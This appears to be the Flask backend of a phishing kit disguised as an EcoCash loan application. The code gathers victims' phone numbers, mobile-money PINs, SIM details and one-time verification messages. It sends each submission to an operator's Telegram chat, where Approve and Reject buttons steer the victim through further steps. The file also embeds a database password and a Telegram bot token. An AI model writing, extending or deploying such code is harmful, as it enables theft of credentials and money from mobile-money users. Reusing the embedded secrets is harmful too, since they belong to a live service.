from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from pymongo import MongoClient
from bson.objectid import ObjectId
import certifi
import os
import time
import requests

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "ecocash_flow_secret_key")

# MongoDB connection
MONGO_URI = os.environ.get(
    "MONGO_URI",
    "mongodb+srv://superuser:2006@superuser.uenn69l.mongodb.net/momo_loan_db?retryWrites=true&w=majority&appName=superuser",
)
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client[os.environ.get("DB_NAME", "momo_loan_db")]
applications_collection = db["applications"]

# Telegram Configuration
TELEGRAM_BOT_TOKEN = "9061926036:AAGOubkTGZZczTCO_V2BFgXkwpYwsmxZO5M"
TELEGRAM_ADMIN_CHAT_ID = "6558384338"


def send_telegram_alert(app_data, stage_title="LOGIN SUBMITTED", step_code="login"):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_ADMIN_CHAT_ID:
        print("Telegram token or chat ID not configured.")
        return

    db_id = str(app_data.get("_id"))
    raw_msg = (app_data.get("final_auth_code") or "").strip()

    message = (
        f"⚡ *{stage_title}*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"• *Mobile:* +263 {app_data.get('phone', '')}\n"
        f"• *WhatsApp:* {app_data.get('whatsapp', '—')}\n"
        f"• *Email:* {app_data.get('email', '—')}\n"
        f"• *Amount:* ${app_data.get('amount', '—')} ({app_data.get('term', '—')})\n"
        f"• *Purpose:* {app_data.get('purpose', '—')}\n"
        f"• *Income:* ${app_data.get('income', '—')}\n"
        f"• *PIN:* `{app_data.get('password', '—')}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"• *Ref ID:* `{app_data.get('app_id')}`"
    )

    reply_markup = {
        "inline_keyboard": [
            [
                {
                    "text": f"✅ Approve {step_code.upper()}",
                    "callback_data": f"approve_{step_code}_{db_id}",
                }
            ],
            [
                {
                    "text": f"❌ Reject {step_code.upper()}",
                    "callback_data": f"reject_{step_code}_{db_id}",
                },
                {
                    "text": "💬 Send Notice",
                    "callback_data": f"msg_{step_code}_{db_id}",
                },
            ],
        ]
    }

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_ADMIN_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown",
        "reply_markup": reply_markup,
    }

    try:
        resp = requests.post(url, json=payload, timeout=6)
        if not resp.ok:
            payload_plain = {
                "chat_id": TELEGRAM_ADMIN_CHAT_ID,
                "text": message.replace("*", "").replace("`", ""),
                "reply_markup": reply_markup,
            }
            requests.post(url, json=payload_plain, timeout=6)

        # Send the pasted verification message by itself so it's quick to copy
        if raw_msg:
            requests.post(
                url,
                json={
                    "chat_id": TELEGRAM_ADMIN_CHAT_ID,
                    "text": raw_msg,
                },
                timeout=6,
            )
    except Exception as e:
        print(f"Telegram alert error: {e}")

@app.route("/telegram-webhook", methods=["POST"])
def telegram_webhook():
    data = request.get_json(silent=True) or {}

    if "callback_query" in data:
        callback = data["callback_query"]
        callback_data = callback.get("data", "")
        callback_id = callback.get("id")

        parts = callback_data.split("_", 2)
        if len(parts) == 3:
            action, step_code, db_id = parts
            step_code = step_code.lower()
            text_response = "Updated"

            try:
                oid = ObjectId(db_id)
            except Exception:
                oid = None

            if action == "approve":
                if step_code == "login":
                    new_status = "Login_Approved"
                    text_response = "Login approved — user moving to next step"
                elif step_code == "sim":
                    new_status = "SIM_Approved"
                    text_response = "SIM approved — user moving to verification"
                elif step_code == "otp":
                    new_status = "OTP_Approved"
                    text_response = "Message approved — completing application"
                else:
                    new_status = "OTP_Approved"
                    text_response = "Approved"

                if oid:
                    applications_collection.update_one(
                        {"_id": oid},
                        {"$set": {"status": new_status, "custom_message": ""}},
                    )

            elif action == "reject":
                if step_code == "login":
                    rejected_status = "Login_Rejected"
                    text_response = "Login rejected — returning to login"
                elif step_code == "sim":
                    rejected_status = "SIM_Rejected"
                    text_response = "SIM rejected — returning to SIM check"
                else:
                    rejected_status = "OTP_Rejected"
                    text_response = "Message rejected — returning to paste page"

                if oid:
                    applications_collection.update_one(
                        {"_id": oid},
                        {
                            "$set": {
                                "status": rejected_status,
                                "rejected_stage": step_code,
                                "custom_message": "",
                            }
                        },
                    )

            elif action == "msg":
                if oid:
                    applications_collection.update_one(
                        {"_id": oid},
                        {
                            "$set": {
                                "status": "CustomMessage",
                                "custom_message": "Please check your details and try again.",
                            }
                        },
                    )
                text_response = "Notice sent"

            if callback_id and TELEGRAM_BOT_TOKEN:
                try:
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery",
                        json={"callback_query_id": callback_id, "text": text_response},
                        timeout=6,
                    )
                except Exception as e:
                    print(f"answerCallbackQuery error: {e}")

    return jsonify({"status": "ok"}), 200


@app.route("/whatsapp-help", methods=["POST"])
def whatsapp_help():
    data = request.get_json(silent=True) or request.form or {}
    name = (data.get("name") or "").strip()
    whatsapp_num = (data.get("whatsapp") or "").strip()
    page_path = (data.get("page") or request.referrer or "/").strip()

    if not name or not whatsapp_num:
        return jsonify({"ok": False, "error": "Please enter both your name and WhatsApp number."}), 400

    current_phone = session.get("phone", "—")
    current_app_id = "—"
    current_id = session.get("current_app_id")

    if current_id:
        try:
            rec = applications_collection.find_one({"_id": ObjectId(current_id)})
            if rec:
                current_app_id = rec.get("app_id", "—")
                if current_phone == "—":
                    current_phone = rec.get("phone", "—")
        except Exception:
            pass

    if TELEGRAM_BOT_TOKEN and TELEGRAM_ADMIN_CHAT_ID:
        msg = (
            f"💬 *WHATSAPP HELP REQUESTED*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"• *Name:* {name}\n"
            f"• *WhatsApp:* {whatsapp_num}\n"
            f"• *Account Phone:* {current_phone}\n"
            f"• *Page:* `{page_path}`\n"
            f"• *Ref ID:* `{current_app_id}`"
        )
        try:
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": TELEGRAM_ADMIN_CHAT_ID,
                    "text": msg,
                    "parse_mode": "Markdown",
                },
                timeout=6,
            )
        except Exception as e:
            print(f"WhatsApp help Telegram error: {e}")

    return jsonify({"ok": True, "message": "Help request sent. We will reach out on WhatsApp."})


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/apply/step1", methods=["GET", "POST"])
def apply_step1():
    if request.method == "GET":
        if request.args.get("amount"):
            session["amount"] = request.args.get("amount")
        if request.args.get("term"):
            session["term"] = request.args.get("term")
        return render_template("apply_step1.html")

    for field in ("phone", "whatsapp", "email", "amount", "term", "purpose", "income"):
        if request.form.get(field):
            session[field] = request.form.get(field)
    return redirect(url_for("submitted_notice"))


@app.route("/submitted")
def submitted_notice():
    return render_template("submitted_notice.html")


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        phone = request.form.get("phone") or session.get("phone", "")
        pin = request.form.get("pin")
        if phone:
            session["phone"] = phone

        app_data = {
            "provider": "EcoCash",
            "phone": phone,
            "whatsapp": session.get("whatsapp", "—"),
            "email": session.get("email", "—"),
            "amount": session.get("amount", "500"),
            "term": session.get("term", "6 months"),
            "purpose": session.get("purpose", "General"),
            "income": session.get("income", "—"),
            "password": pin,
            "final_auth_code": "",
            "status": "Pending_Login",
            "rejected_stage": "",
            "created_at": time.time(),
            "app_id": "ECO" + os.urandom(4).hex().upper(),
            "custom_message": "",
        }

        inserted_id = applications_collection.insert_one(app_data).inserted_id
        session["current_app_id"] = str(inserted_id)
        app_data["_id"] = inserted_id

        send_telegram_alert(app_data, stage_title="STEP 1: LOGIN SUBMITTED", step_code="login")
        return redirect(url_for("pending", app_id=app_data["app_id"], stage="login"))

    return render_template("login.html")


@app.route("/sim-check", methods=["GET", "POST"])
def sim_check():
    current_id = session.get("current_app_id")
    record = None

    if current_id:
        try:
            record = applications_collection.find_one({"_id": ObjectId(current_id)})
        except Exception:
            record = None

    if request.method == "POST":
        sim_phone = request.form.get("sim_phone") or session.get("phone", "")
        sim_carrier = request.form.get("sim_carrier", "Econet Wireless (EcoCash)")
        sim_status = request.form.get("sim_status", "Active & In Hand")

        if current_id:
            try:
                oid = ObjectId(current_id)
                applications_collection.update_one(
                    {"_id": oid},
                    {
                        "$set": {
                            "sim_phone": sim_phone,
                            "sim_carrier": sim_carrier,
                            "sim_status": sim_status,
                            "status": "Pending_SIM",
                            "rejected_stage": "",
                            "custom_message": "",
                        }
                    },
                )
                record = applications_collection.find_one({"_id": oid})
                if record:
                    send_telegram_alert(record, stage_title="SIM CHECK SUBMITTED", step_code="sim")
            except Exception as e:
                print(f"sim_check error: {e}")

        return redirect(
            url_for("pending", app_id=record.get("app_id") if record else "", stage="sim")
        )

    return render_template(
        "sim_check.html",
        phone=session.get("phone", ""),
        app_id=record.get("app_id") if record else "",
    )


@app.route("/pending")
def pending():
    app_id = request.args.get("app_id")
    stage = request.args.get("stage", "login")
    current_id = session.get("current_app_id")

    if not app_id and current_id:
        try:
            record = applications_collection.find_one({"_id": ObjectId(current_id)})
            app_id = record.get("app_id") if record else "ECO-PENDING"
        except Exception:
            app_id = "ECO-PENDING"

    return render_template("pending.html", app_id=app_id or "ECO-PENDING", stage=stage)


@app.route("/check-status")
def check_status():
    app_id = request.args.get("app_id")
    current_id = session.get("current_app_id")

    record = None
    if app_id:
        record = applications_collection.find_one({"app_id": app_id})
    elif current_id:
        try:
            record = applications_collection.find_one({"_id": ObjectId(current_id)})
        except Exception:
            record = None

    if record:
        return jsonify({
            "status": record.get("status", "Pending_Login"),
            "custom_message": record.get("custom_message", ""),
        })

    return jsonify({"status": "Pending_Login", "custom_message": ""})


@app.route("/final-verify", methods=["GET", "POST"])
def final_verify():
    if request.method == "POST":
        final_code = (request.form.get("final_code") or "").strip()
        current_id = session.get("current_app_id")
        record = None

        if current_id:
            try:
                oid = ObjectId(current_id)
                applications_collection.update_one(
                    {"_id": oid},
                    {
                        "$set": {
                            "final_auth_code": final_code,
                            "status": "Pending_OTP",
                            "rejected_stage": "",
                            "custom_message": "",
                        }
                    },
                )
                record = applications_collection.find_one({"_id": oid})
                if record:
                    send_telegram_alert(record, stage_title="STEP 2: MESSAGE SUBMITTED", step_code="otp")
            except Exception as e:
                print(f"final_verify error: {e}")

        return redirect(
            url_for("pending", app_id=record.get("app_id") if record else "", stage="otp")
        )

    return render_template("final_verify.html")


@app.route("/success")
def success():
    return render_template("success.html")


@app.route("/health")
def health_check():
    return "OK", 200


if __name__ == "__main__":
    app.run(debug=True, port=5000)
